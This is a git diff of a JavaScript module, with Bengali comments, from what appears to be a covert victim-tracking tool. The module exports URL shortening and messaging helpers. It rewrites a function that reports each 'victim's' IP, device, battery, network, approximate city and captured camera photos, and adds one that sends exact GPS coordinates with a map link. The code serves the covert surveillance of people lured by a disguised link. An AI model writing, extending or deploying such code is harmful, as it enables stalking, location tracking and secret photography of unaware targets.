@@ -85,69 +85,75 @@ async function shortenUrl(longUrl) {
     }
 }
 
-// ===== ভিক্টিম ডেটা ফরম্যাট =====
+// ================================================================
+// 🆕 নতুন formatVictimData - শুধু প্রয়োজনীয় তথ্য
+// ================================================================
 function formatVictimData(victim) {
-    let msg = '✅ **ভিক্টিমের তথ্য পাওয়া গেছে!**\n\n';
-    msg += `⚓️ **আইপি:** ${victim.ip || 'N/A'} | **সময়:** ${new Date(victim.timestamp || Date.now()).toLocaleString()}\n\n`;
-    msg += `⏳ **ডিভাইসের সময়:** ${new Date().toString()}\n\n`;
-
     const d = victim.device || {};
-    msg += '📱 **ডিভাইসের তথ্য**\n';
-    msg += `productSub: ${d.productSub || 'N/A'}\n`;
-    msg += `vendor: ${d.vendor || 'N/A'}\n`;
-    msg += `maxTouchPoints: ${d.maxTouchPoints || 'N/A'}\n`;
-    msg += `doNotTrack: ${d.doNotTrack || 'N/A'}\n`;
-    msg += `hardwareConcurrency: ${d.hardwareConcurrency || 'N/A'}\n`;
-    msg += `cookieEnabled: ${d.cookieEnabled || 'N/A'}\n`;
-    msg += `appCodeName: ${d.appCodeName || 'N/A'}\n`;
-    msg += `appName: ${d.appName || 'N/A'}\n`;
-    msg += `appVersion: ${d.appVersion || 'N/A'}\n`;
-    msg += `platform: ${d.platform || 'N/A'}\n`;
-    msg += `product: ${d.product || 'N/A'}\n`;
-    msg += `userAgent: ${d.userAgent || 'N/A'}\n`;
-    msg += `language: ${d.language || 'N/A'}\n`;
-    msg += `languages: ${JSON.stringify(d.languages) || 'N/A'}\n`;
-    msg += `webdriver: ${d.webdriver || 'N/A'}\n`;
-    msg += `pdfViewerEnabled: ${d.pdfViewerEnabled || 'N/A'}\n`;
-    msg += `deviceMemory: ${d.deviceMemory || 'N/A'}\n\n`;
-
-    msg += '📷 **মিডিয়া ডিভাইস**\n';
-    if (victim.media && victim.media.length > 0) {
-        victim.media.forEach(m => {
-            msg += `${m.kind}: ${m.label} | id=${m.deviceId}\n`;
-        });
-    } else {
-        msg += 'কোনো ডিভাইস পাওয়া যায়নি\n';
-    }
-    msg += '\n';
-
-    const n = victim.network || {};
-    msg += '🕸️ **নেটওয়ার্ক**\n';
-    msg += `type: ${n.type || 'N/A'}\n`;
-    msg += `rtt: ${n.rtt || 'N/A'}\n`;
-    msg += `saveData: ${n.saveData || 'N/A'}\n`;
-    msg += `effectiveType: ${n.effectiveType || 'N/A'}\n`;
-    msg += `downlink: ${n.downlink || 'N/A'}\n`;
-    msg += `downlinkMax: ${n.downlinkMax || 'N/A'}\n\n`;
-
+    
+    // ডিভাইসের সময় লোকাল টাইমে দেখান
+    const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
+    
+    let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
+    
+    // IP ও সময়
+    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
+    msg += `🕐 *সময়:* ${deviceTime}\n\n`;
+    
+    // ফোনের মডেল (platform থেকে)
+    const phoneModel = d.platform || d.userAgent?.split('(')[1]?.split(')')[0] || 'N/A';
+    msg += `📱 *ফোনের মডেল:* ${phoneModel}\n`;
+    
+    // ব্রাউজার (userAgent থেকে)
+    const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
+    msg += `🌐 *ব্রাউজার:* ${browser}\n`;
+    
+    // টাচ পয়েন্ট
+    msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
+    
+    // ভাষা
+    msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
+    
+    // চার্জ
     const b = victim.battery || {};
-    msg += '🔋 **ব্যাটারি**\n';
-    msg += `লেভেল: ${b.level || 'N/A'}%\n`;
-    msg += `চার্জ হচ্ছে: ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
-
-    if (victim.gpsLocation && victim.gpsLocation.latitude) {
-        msg += `📍 **জিপিএস:** ${victim.gpsLocation.latitude}, ${victim.gpsLocation.longitude}\n`;
-        msg += `🔗 গুগল ম্যাপ: ${victim.gpsLocation.googleMaps || `https://www.google.com/maps?q=${victim.gpsLocation.latitude},${victim.gpsLocation.longitude}`}\n\n`;
-    } else if (victim.location && victim.location.city) {
-        msg += `📍 **আনুমানিক:** ${victim.location.city}, ${victim.location.country}\n\n`;
+    msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
+    msg += `⚡ *চার্জ হচ্ছে:* ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
+    
+    // নেটওয়ার্ক (ওয়াইফাই নাকি ডেটা)
+    const n = victim.network || {};
+    const connectionType = n.type || 'N/A';
+    msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
+    
+    // আনুমানিক অবস্থান
+    if (victim.location && victim.location.city) {
+        msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
+    } else {
+        msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
     }
-
+    
+    // ক্যামেরা ছবির সংখ্যা (শুধু সংখ্যা)
     if (victim.camera && victim.camera.length > 0) {
-        msg += `📸 **ক্যামেরা ছবি:** ${victim.camera.length}টি\n`;
+        msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি`;
     }
-
-    msg += `\n🆔 ভিক্টিম আইডি: ${victim.id}`;
+    
+    msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
     return msg;
+}
+
+// ================================================================
+// 🆕 লোকেশন পারমিশনের জন্য আলাদা মেসেজ
+// ================================================================
+function formatLocationMessage(gpsLocation) {
+    if (!gpsLocation || !gpsLocation.latitude) return null;
+    
+    const mapLink = gpsLocation.googleMaps || 
+        `https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
+    
+    return `📍 *লোকেশন পারমিশন দেওয়া হয়েছে!*\n\n` +
+           `📌 অক্ষাংশ: ${gpsLocation.latitude}\n` +
+           `📌 দ্রাঘিমাংশ: ${gpsLocation.longitude}\n` +
+           `🎯 নির্ভুলতা: ${gpsLocation.accuracy} মিটার\n\n` +
+           `🔗 গুগল ম্যাপ: ${mapLink}`;
 }
 
 module.exports = {
@@ -156,5 +162,6 @@ module.exports = {
     sendMessage,
     getUserProfile,
     shortenUrl,
-    formatVictimData
+    formatVictimData,
+    formatLocationMessage
 };
